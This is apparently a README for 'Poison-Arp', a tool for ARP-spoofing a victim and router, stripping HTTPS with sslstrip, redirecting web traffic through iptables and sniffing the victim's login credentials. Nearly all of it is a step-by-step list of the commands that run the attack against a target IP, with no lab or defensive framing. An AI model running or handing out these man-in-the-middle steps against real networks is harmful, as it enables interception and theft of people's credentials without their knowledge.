# Poison-Arp

This is tool can poison the Arp tables of the victim as well as router and sniff all the credentials of the victim.It works with both HTTP and HTTPS but not with HSTS.

Here I am going to import scapy module which is not inbuit in python3 so you have to install it manually by the following command:-

$ pip3 install scapy-python3

or 

$ apt-get install scapy-python3

or
    
    $ git clone https://github.com/phaethon/scapy
    $ cd scapy
    $ sudo python3 setup.py install
    
   

Step 1:- Now run the arp-spoofer  with the below command 

$ python3 arp_spoofer.py --gateway  ap_ip --target victim_ip

![](/images/spoofy.png)

Step 2: Run the sslstrip with the below command

$ sslstrip

![](/images/ssltrip.png)

Step 3: forward all the traffic to sslstrip port using iptables with the following command 

$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 10000 

![](/images/iptables.png)


Step 4: Run the sniffer with the following command

$ python3 sniffer.py -i interface

![](/images/login_new.png)








